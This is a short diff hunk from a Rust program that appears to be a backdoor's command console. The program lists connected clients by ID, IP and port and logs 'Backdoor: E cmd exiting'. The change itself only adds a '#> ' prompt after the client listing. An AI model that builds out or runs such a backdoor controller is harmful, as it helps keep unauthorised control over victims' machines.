@@ -352,6 +352,7 @@ loop{
                         let one_client = format!("Client ID: {} Client IP: {} Client Status: {} Client Port: {} Client CID: {}\n", client.id, client.ip, client.status, client.port, client.cid);
                         stream.write(one_client.as_bytes()).unwrap();
                     }                                 
+                    stream.write_all("#> ".as_bytes()).unwrap();
                 }else if received_data.trim() == "E" || received_data.trim() == "E" {
                     log::info!("Backdoor: E cmd exiting...");               
                     stream.write_all("#> ".as_bytes()).unwrap();
